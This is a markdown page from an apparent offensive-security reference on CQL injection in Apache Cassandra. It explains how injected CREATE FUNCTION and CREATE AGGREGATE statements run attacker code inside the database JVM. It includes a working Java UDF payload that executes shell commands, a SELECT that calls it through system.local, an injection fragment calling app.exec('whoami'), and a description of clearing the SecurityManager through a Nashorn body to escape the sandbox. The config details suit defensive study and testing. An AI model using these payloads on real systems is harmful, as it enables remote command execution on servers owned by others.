---
title: "User-defined function abuse: code execution via injected CQL functions"
description: "Where user-defined functions are enabled, injected CREATE FUNCTION or CREATE AGGREGATE with a Java body runs attacker code inside the Cassandra JVM."
keywords:
  - CQL user-defined function
  - CREATE FUNCTION
  - CREATE AGGREGATE
  - Cassandra code execution
  - UDF abuse
---

# User-defined function abuse

CQL lets operators define functions in the database with `CREATE FUNCTION` and aggregates with `CREATE AGGREGATE`. When this feature is enabled and the injection point can reach DDL, an attacker defines a function whose body is arbitrary code and runs it inside the Cassandra server's JVM.

## The enabling condition

User-defined functions run only when the node's configuration turns them on:

```yaml
enable_user_defined_functions: true
```

By default this is off, and enabling it is necessary but not sufficient, because a second setting is the actual sandbox:

```yaml
enable_user_defined_functions_threads: true   # default
```

With threads enabled (the default), every UDF body runs in a dedicated thread under a Java `SecurityManager` granted **no** permissions, so `Runtime.exec`, reflection, and file or socket access all throw `AccessControlException`. A plain `LANGUAGE java` body that calls `Runtime.getRuntime().exec` is blocked outright on such a node. Code execution requires the non-default `enable_user_defined_functions_threads: false`, which runs UDFs directly in the daemon thread under a permissioned `SecurityManager`; the reliable primitive there is a scripted (JavaScript/Nashorn) UDF whose body disables the `SecurityManager` through reflection before acting. The Java example below is the shape of the payload, not something that succeeds on a default-sandboxed node.

## Defining a malicious function

Where injection reaches a statement boundary that can carry DDL, a `CREATE FUNCTION` with a Java body plants the code:

```sql
CREATE FUNCTION app.exec(cmd text)
  RETURNS NULL ON NULL INPUT
  RETURNS text
  LANGUAGE java
  AS $$
    try {
      Process p = Runtime.getRuntime().exec(cmd);
      java.util.Scanner s = new java.util.Scanner(p.getInputStream()).useDelimiter("\\A");
      return s.hasNext() ? s.next() : "";
    } catch (Exception e) { return e.toString(); }
  $$;
```

Calling it then runs the command and, because the function returns `text`, can return the output into a `SELECT`:

```sql
SELECT app.exec('id') FROM system.local;
```

`system.local` is a single-row table present on every node, which makes it a convenient driver for a one-shot call. On a node with the default thread sandbox this call returns an `AccessControlException` rather than command output. Where `enable_user_defined_functions_threads` is `false`, the practical body is the deprecated **JavaScript** (Nashorn) form, `LANGUAGE javascript`, which first reaches through reflection to clear the active `SecurityManager` (`System.setSecurityManager(null)`) and only then invokes `Runtime.getRuntime().exec`, so the subsequent command runs unrestricted in the service account's JVM.

## Reaching the DDL from injection

`CREATE FUNCTION` is a standalone DDL statement, not a `WHERE` fragment, and a CQL `BATCH` accepts only `INSERT`, `UPDATE`, and `DELETE`, so it cannot carry DDL. Planting a UDF therefore needs a sink that submits a complete statement of its own: an administrative or query-builder interface that runs attacker-chosen CQL, or a driver configured to accept multiple statements per request. The two-step pattern is one request that defines the function and a second that calls it, which also sidesteps the single-statement-per-request limit of the native protocol.

## Calling an existing malicious UDF

Where a usable function already exists, whether an operator-defined one or one planted earlier, injection only needs to call it. A function reference drops straight into a `SELECT` projection or a `WHERE` comparison:

```sql
' AND app.exec('whoami') = 'x' ALLOW FILTERING /*
```

Even when the result is not reflected, the side effect (the command running) still fires, and output can be recovered through the same boolean channel described in [Blind inference](cql/blind.md) by comparing the returned value character by character.

## Aggregates for state

`CREATE AGGREGATE` combines a state function with a final function over a result set, which lets a body run once per row and accumulate state across a scan. This is useful where a single call is constrained but a scan over a table is reachable, turning each processed row into another execution of the injected body.

## References

- [Apache Cassandra: CREATE FUNCTION](https://cassandra.apache.org/doc/latest/cassandra/cql/functions.html#create-function)
- [Apache Cassandra: CREATE AGGREGATE](https://cassandra.apache.org/doc/latest/cassandra/cql/functions.html#aggregate-functions)
- [PayloadsAllTheThings: NoSQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection)
